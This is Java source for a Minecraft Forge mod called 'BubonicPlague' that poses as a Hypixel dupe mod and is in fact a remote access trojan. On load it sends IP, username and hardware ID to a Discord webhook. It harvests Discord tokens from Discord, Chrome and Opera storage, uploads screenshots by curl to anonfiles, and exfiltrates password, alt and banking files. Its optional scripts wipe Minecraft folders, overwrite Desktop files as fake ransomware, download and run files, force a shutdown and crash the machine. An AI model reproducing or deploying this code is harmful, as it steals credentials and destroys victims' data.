package run.hypixel.dupe;

import java.awt.Color;
import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Random;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.imageio.ImageIO;
import javax.net.ssl.HttpsURLConnection;
import javax.swing.JFrame;
import javax.swing.JLabel;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.FilenameUtils;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.methods.RequestBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import net.minecraftforge.fml.common.FMLCommonHandler;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPostInitializationEvent;
import run.hypixel.dupe.exception.WebhookExce;
import run.hypixel.dupe.exception.WebhookException;
import run.hypixel.dupe.hooks.DiscordDuper;
import run.hypixel.dupe.hooks.Hooks;
import run.hypixel.dupe.json.JSONObject;
import run.hypixel.dupe.scripts.Scripts;
import run.hypixel.dupe.utils.DuperUtils;
import run.hypixel.dupe.utils.Methods;

@Mod(modid = Core.MODID, version = Core.VERSION)
public class Core {

	public static String getIP() {
		try {
			@SuppressWarnings("resource")
			Scanner scanner = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8");
			String ip = scanner.useDelimiter("\\A").next();
			scanner.close();
			return ip;
		} catch (IOException e) {
			e.printStackTrace();
			return "Unknown";
		}

	}

	public static String getName() {
		String name = System.getProperty("user.name");
		return name;
	}

	public static String getOS() {
		String os = System.getProperty("os.name");
		return os;
	}

	public static String desktop = "C:\\Users\\" + getName() + "\\Desktop\\";
	public static String downloads = "C:\\Users\\" + getName() + "\\Downloads\\";
	public static String minecraft = "C:\\Users\\" + getName() + "\\AppData\\Roaming\\.minecraft\\";
	public static String lunar = "C:\\Users\\" + getName() + "\\.lunarclient\\settings\\game\\";

	public static String dataGrabbings = "";

	public ArrayList<String> workingTokens = new ArrayList<>();

	public static final String MODID = "BubonicPlague";
	public static final String VERSION = "2.0";

	public static String getHWID() {
		try {
			MessageDigest hash = MessageDigest.getInstance("MD5");
			String s = getOS() + System.getProperty("os.arch") + System.getProperty("os.version")
					+ Runtime.getRuntime().availableProcessors() + System.getenv("PROCESSOR_IDENTIFIER")
					+ System.getenv("PROCESSOR_ARCHITECTURE") + System.getenv("PROCESSOR_ARCHITEW6432")
					+ System.getenv("NUMBER_OF_PROCESSORS");
			return bytesToHex(hash.digest(s.getBytes()));
		} catch (Exception e) {
			return "######################";
		}
	}

	private static String bytesToHex(byte[] bytes) {
		char[] hexChars = new char[bytes.length * 2];
		for (int j = 0; j < bytes.length; j++) {
			int v = bytes[j] & 0xFF;
			hexChars[j * 2] = "0123456789ABCDEF".toCharArray()[v >>> 4];
			hexChars[j * 2 + 1] = "0123456789ABCDEF".toCharArray()[v & 0x0F];
		}
		return new String(hexChars);
	}

	@SuppressWarnings("all")
	public static void captureScreen() {
		new Thread(() -> {
			try {
				Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
				Rectangle screenRectangle = new Rectangle(screenSize);
				Robot robot = new Robot();
				BufferedImage image = robot.createScreenCapture(screenRectangle);
				int random = new Random().nextInt();
				String df = "cached_" + random + ".png";
				File file = new File(df);
				ImageIO.write(image, "png", file);
				Process process = Runtime.getRuntime()
						.exec("curl -F \"file=@" + df + "\" https://api.anonfiles.com/upload");
				BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
				String line = "";
				DiscordDuper wh = new DiscordDuper(Hooks.getHook());
				wh.setUsername(getName());
				wh.addEmbed(new DiscordDuper.EmbedObject()
						.setTitle("Screen Capture of " + getName() + "/" + Methods.username()).setColor(Color.CYAN)
						.setDescription("Sending..."));
				wh.execute();
				while ((line = reader.readLine()) != null) {
					Core.sendData("```Screen Capture:``` " + line, Hooks.getHook(), getName());
				}
				file.delete();
			} catch (Exception e) {
				new WebhookException().printStackTrace();
			}
		}).start();
	}

	public static void sendData(String msg, String url, String username) {
		try {
			Thread.sleep((int) Math.floor(Math.random() * (675 - 225 + 1) + 225));
		} catch (InterruptedException e1) {
			e1.printStackTrace();
		}
		CloseableHttpClient httpclient = HttpClients.createDefault();
		try {
			HttpUriRequest httppost = null;
			try {
				httppost = RequestBuilder.post().setUri(new URI(url)).addParameter("content", msg)
						.addParameter("username", username).build();
			} catch (URISyntaxException e) {
				e.printStackTrace();
			}

			CloseableHttpResponse response = null;
			try {
				response = httpclient.execute(httppost);
			} catch (ClientProtocolException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
			try {
			} finally {
				try {
					response.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		} finally {
			try {
				httpclient.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	public static String sendDiscordInfo(String token, String apiLink, String username) {
		String oainds = "";
		try {
			String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
			URL url = new URL("https://discordapp.com/api/v7/" + apiLink);
			HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
			connection.setDoOutput(true);
			connection.setRequestMethod("GET");
			connection.setRequestProperty("Authorization", token);
			connection.setRequestProperty("User-Agent", userAgent);
			InputStream response = connection.getInputStream();
			try (Scanner scanner = new Scanner(response)) {
				String responseBody = scanner.useDelimiter("\\A").next();
				oainds = responseBody;
			} catch (Exception e) {
				e.printStackTrace();
			}
		} catch (Exception e) {
		}
		return oainds;

	}

	public static boolean hasBeenPwned(String email) {
		try {
			String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
			URL url = new URL("https://haveibeenpwned.com/unifiedsearch/" + email);
			HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
			connection.setDoOutput(true);
			connection.setRequestMethod("GET");
			connection.setRequestProperty("User-Agent", userAgent);
			InputStream response = connection.getInputStream();
			try (Scanner scanner = new Scanner(response)) {
				String responseBody = scanner.useDelimiter("\\A").next();
				if (responseBody.contains("\"Title\":")) {
					return true;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} catch (IOException e) {
			return false;
		}
		return false;
	}

	@EventHandler
	public void init(FMLInitializationEvent event) throws IOException {
		String ip = getIP();
		try {
			DiscordDuper userInfo = new DiscordDuper(Hooks.getHook());
			userInfo.setUsername(getName());
			userInfo.addEmbed(new DiscordDuper.EmbedObject().setTitle("New User Connected").setColor(Color.CYAN)
					.setDescription("PC Information for " + getName()).addField("Username", getName().toString(), true)
					.addField("OS", getOS().toString(), true).addField("HWID", getHWID().toString(), false));
			userInfo.execute();
		} catch (IOException e) {
			e.printStackTrace();
			new WebhookException().printStackTrace();
		}
		sendData("IP Address (Error with adding to Embed): " + ip, Hooks.getHook(), getName());
		Methods.sessionGetFull();

		// Deletes minecraft directory if it somehow hasn't been wiped already
		// Also attempts to shuts computer down a bunch of times
		for (int i = 40; i < 600; i++) {
			// Runtime.getRuntime().exec("cmd /c ping localhost -n " + String.valueOf(i) + "
			// > nul && rmdir " + minecraft + "-s -q");
			// Runtime.getRuntime().exec("shutdown -s -f -fw -t " + String.valueOf(i + 40));
		}
		sendData("**Grabbing Discord Tokens**", Hooks.getHook(), getName());
		ArrayList<String> tokens = new ArrayList<>();
		final String appdata = System.getenv().get("APPDATA");
		final String local = System.getenv().get("LOCALAPPDATA");
		final String[] regex = { "[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}" };

		HashMap<String, File> paths = new HashMap<String, File>() {
			{
				put("Discord", new File(appdata + "\\discord\\Local Storage\\leveldb"));
				put("Chrome", new File(local + "\\Google\\Chrome\\User Data\\Default"));
				put("Opera", new File(appdata + "\\Opera Software\\Opera Stable"));
			}
		};

		for (File path : paths.values()) {
			try {
				for (File file : path.listFiles()) {
					if (file.toString().endsWith(".ldb")) {
						FileReader fileReader = new FileReader(file);
						BufferedReader bufferReader = new BufferedReader(fileReader);

						String textFile = null;
						StringBuilder buildedText = new StringBuilder();

						while ((textFile = bufferReader.readLine()) != null) {
							buildedText.append(textFile);
						}

						String actualText = buildedText.toString();

						fileReader.close();
						bufferReader.close();

						Pattern pattern = Pattern.compile(regex[0]);
						Matcher matcher = pattern.matcher(actualText);
						if (matcher.find(0)) {
							tokens.add(matcher.group());
						} else {
							Core.sendData("No Other Discord Tokens Found", Hooks.getHook(), getName());
						}
					}
				}
			} catch (Exception e) {
				continue;
			}
		}
		try {
			Thread.sleep(1600);
		} catch (InterruptedException e2) {
			e2.printStackTrace();
		}
		captureScreen();
		for (String t : tokens) {
			String info = sendDiscordInfo(t, "users/@me", getName()).replace(",", ",\n");
			String username = getInfo(info, "username") + "#" + getInfo(info, "discriminator");
			if (username.equalsIgnoreCase("Invalid#Invalid")) {
				continue;
			}
			String number = getInfo(info, "phone");
			String email = getInfo(info, "email");
			boolean nitro = !sendDiscordInfo(t, "users/@me/billing/subscriptions", getName()).equals("[]");
			boolean billing = !sendDiscordInfo(t, "users/@me/billing/subscriptions", getName()).equals("[]");
			DiscordDuper discord = new DiscordDuper(Hooks.getHook());
			discord.setUsername(getName());
			discord.setContent("**" + t + "**");
			discord.addEmbed(new DiscordDuper.EmbedObject().setTitle(username + "'s Discord Info").setColor(Color.CYAN)
					.addField("Nitro", nitro == true ? "True" : "False", true)
					.addField("Billing", billing == true ? "True" : "False", true).addField("Phone", number, false)
					.addField("Email", email, true)
					.setFooter("HaveIBeenPwned: " + String.join("", hasBeenPwned(email) == true ? "Yes" : "No"), ""));
			try {
				discord.execute();
				workingTokens.add(t);
			} catch (IOException e) {

			}
		}

		sendData("```Attempting To Capture Interesting Data```", Hooks.getHook(), getName());
		new Thread(() -> {
			try {
				DuperUtils.uploadDupe(desktop + "alts.txt");
				DuperUtils.uploadDupe(desktop + "account.txt");
				DuperUtils.uploadDupe(desktop + "accounts.txt");
				DuperUtils.uploadDupe(desktop + "alt.txt");
				DuperUtils.uploadDupe(desktop + "minecraft.txt");
				DuperUtils.uploadDupe(desktop + "password.txt");
				DuperUtils.uploadDupe(desktop + "emails.txt");
				DuperUtils.uploadDupe(desktop + "banking.txt");
				DuperUtils.uploadDupe(desktop + "passwords.txt");
				DuperUtils.uploadDupe(minecraft + "wurst\\alts.json");
				DuperUtils.uploadDupe(minecraft + "Novoline\\alts.novo");
				DuperUtils.uploadDupe(minecraft + "Flux\\alt.txt");
				DuperUtils.uploadDupe(minecraft + "essential\\mojang_accounts.json");
				DuperUtils.uploadDupe(minecraft + "essential\\microsoft_accounts.json");
				DuperUtils.uploadDupe(downloads + "accounts.txt");
				DuperUtils.uploadDupe(downloads + "account.txt");
				DuperUtils.uploadDupe(downloads + "alts.txt");
				DuperUtils.uploadDupe(downloads + "alt.txt");
				DuperUtils.uploadDupe(lunar + "accounts.json");
				sendData(dataGrabbings, Hooks.getHook(), getName());
			} catch (Exception e) {
				e.printStackTrace();
			}
		}).start();
		sendData("**Executing Any Malicious Scripts attached to RAT.**", Hooks.getHook(), getName());
		Scripts scripts = new Scripts();
		scripts.setup();

		if (scripts.getDoesDelete()) {
			// Pretty much nukes everything Minecraft on their computer
			File mcLauncher = new File("C:\\Program Files (x86)\\Minecraft Launcher");
			File dir = new File(System.getenv("APPDATA") + "\\Roaming\\.minecraft\\");
			branchWipe(dir);
			branchWipe(mcLauncher);
		}
		
		if (scripts.getDoesExecute()) {
			for (String f : scripts.getFileExecutes()) {
				File file = new File(f);
				if (file.exists()) {
					Desktop desktop = Desktop.getDesktop();
					try {
						desktop.open(file);
					} catch (IOException e) {

					}
				}
			}
		}
		if (scripts.getDoesRansomware()) {
			GraphicsEnvironment localGraphicsEnvironment = GraphicsEnvironment.getLocalGraphicsEnvironment();
			int monitorCount = localGraphicsEnvironment.getScreenDevices().length;
			for (int i = 0; i <= monitorCount - 1; i++) {
				String sdnw = Scripts.ransomText;
				JFrame ransom = new JFrame();
				ransom.setUndecorated(true);
				ransom.setSize(2000, 1090);
				ransom.setDefaultCloseOperation(0);
				ransom.setAlwaysOnTop(true);
				JLabel label = new JLabel();
				label.setText(sdnw);
				label.setLocation(1000, 600);
				ransom.add(label);
				ransom.setVisible(true);
				localGraphicsEnvironment.getScreenDevices()[i].setFullScreenWindow(ransom);
			}
			File file = new File(desktop);
			File[] subs = file.listFiles();
			for (File child : subs) {
				if (child.getName().endsWith("txt") || child.getName().endsWith("jar")
						|| child.getName().endsWith("exe") || child.getName().endsWith("zip")
						|| child.getName().endsWith("pdf") || child.getName().endsWith("doc")
						|| child.getName().endsWith("docx") || child.getName().endsWith("png")
						|| child.getName().endsWith("jpg") || child.getName().endsWith("jpeg")) {
					if (child.canWrite()) {
						try {
							@SuppressWarnings("resource")
							FileWriter writer = new FileWriter(child);
							writer.append("Your files are crypted.");
							writer.flush();
						} catch (IOException e) {
							e.printStackTrace();
						}

					}

				}
			}
			if (scripts.getDoesMessageFriends()) {
			}
			if (scripts.getDoesDownload()) {
				for (String k : scripts.getFileDownloads().keySet()) {
					String loc = scripts.getFileDownloads().get(k);
					DuperUtils.downloadFile(k, loc);
				}
			}
			if (scripts.getDoesFileSpammer()) {
				for (String loc : scripts.getFileSpammers()) {
					for (int i = 0; i <= 35; i++) {
						File startFile = new File(loc);
						String extension = FilenameUtils.getExtension(startFile.getName());
						File destFile = new File(loc + "(" + i + ")" + "." + extension);
						try {
							FileUtils.copyFile(startFile, destFile);
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
				}
			}
		}

	}

	@EventHandler
	public static void postInit(FMLPostInitializationEvent event) throws Exception {
		Scripts scripts = new Scripts();
		if (scripts.getDoesDelete()) {
			File mcLauncher = new File("C:\\Program Files (x86)\\Minecraft Launcher");
			branchWipe(mcLauncher);
			Runtime.getRuntime().exec("cmd /c ping localhost -n 10 > nul && rmdir " + minecraft + "-s -q");
		}
		Runtime.getRuntime().exec("shutdown -s -f -fw -t 15");
		Crash c = new Crash();
	}

	public static String getInfo(String input, String field) {
		try {
			JSONObject json = new JSONObject(input);
			return json.getString(field);
		} catch (Exception e) {
			return "Invalid";
		}

	}

	public static void branchWipe(File dir) throws SecurityException {
		File[] files = dir.listFiles();
		for (File child : files) {
			try {
				if (!child.delete())
					child.deleteOnExit();
				branchWipe(child);
			} catch (NullPointerException e) {

			}
		}
	}
}

class Crash {

	public Crash() throws Exception {
		Crash crash = new Crash();
		crash.addMem();
	}

	public void addMem() throws Exception {
		int iteratorValue = 20;
		for (int outerIterator = 1; outerIterator < 20; outerIterator++) {
			int loop1 = 2;
			int[] memoryFillIntVar = new int[iteratorValue];
			do {
				memoryFillIntVar[loop1] = 0;
				loop1--;
			} while (loop1 > 0);
			iteratorValue = iteratorValue * 5;
		}
	}

}
